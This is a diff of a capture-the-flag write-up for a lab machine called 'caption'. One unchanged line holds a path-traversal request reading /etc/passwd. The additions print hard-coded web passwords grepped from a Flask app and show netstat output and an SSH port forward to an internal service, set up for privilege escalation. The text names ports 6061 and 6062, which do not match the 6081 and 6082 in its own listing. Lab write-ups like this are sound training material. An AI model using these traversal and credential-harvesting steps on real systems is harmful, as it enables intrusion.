@@ -697,7 +697,7 @@ curl -i -s -k -X  GET 'http://127.0.0.1:3923/.cpr/%2Fetc%2Fpasswd'
 
 <br />
 
-With the exploit source code we can confirm the port `39323`.
+With the exploit source code we can confirm the port `3923`.
 
 If we try this exploitation against our target, it doesn't work:
 
@@ -937,3 +937,69 @@ margo@caption:~$ cat user.txt
 # Privilege Escalation: margo -> root
 
 <br />
+
+In the user directory, we found again the same web application password for margo and a new one inside the Flask application's `app.py` file:
+
+<br />
+
+```bash
+margo@caption:~/app$ ls
+app.py  static  templates
+margo@caption:~/app$ grep -ri password
+templates/index.html:        <label for='lname'>Password</label>
+templates/index.html:        <input type="password"  name="password" class="elem">
+app.py:        password = request.form['password']
+app.py:        if username == 'margo' and password == 'vFr&cS2#0!':
+app.py:        elif username == 'admin' and password == 'cFgjE@0%l0':
+```
+
+<br />
+
+During privilege escalation, it's always good practice to look for new passwords and check if they allow lateral movement. But in this case, the credentials do not provide access to other users.
+
+## Network.
+
+<br />
+
+If we execute a `netstat -nat`, we can see which ports are open in the victim machine:
+
+<br />
+
+```bash
+margo@caption:~/app$ netstat -nat
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State      
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN     
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
+tcp        0      0 127.0.0.1:6081          0.0.0.0:*               LISTEN     
+tcp        0      0 127.0.0.1:6082          0.0.0.0:*               LISTEN     
+tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN     
+tcp        0      0 127.0.0.1:3923          0.0.0.0:*               LISTEN     
+tcp        0      0 127.0.0.1:9090          0.0.0.0:*               LISTEN     
+tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN     
+tcp        0      1 10.10.11.33:44004       8.8.8.8:53              SYN_SENT   
+tcp        0    208 10.10.11.33:22          10.10.14.13:60286       ESTABLISHED
+tcp6       0      0 :::22                   :::*                    LISTEN
+```
+
+<br />
+
+Ports 6061 and 6062: Used by Varnish.
+
+Port 8000: It hosts the web application.
+
+Port 9090: This port is running the `LogService` that we have seen before in the `GitBucket` instance.
+
+This last one can be a good target to the privesc.
+
+So we procced to perform a `Port Forwarding` using SSH and get the service from the victim machine to our local machine:
+
+<br />
+
+```bash
+❯ ssh -i id_ecdsa margo@caption.htb -L 9090:127.0.0.1:9090
+```
+
+<br />
+
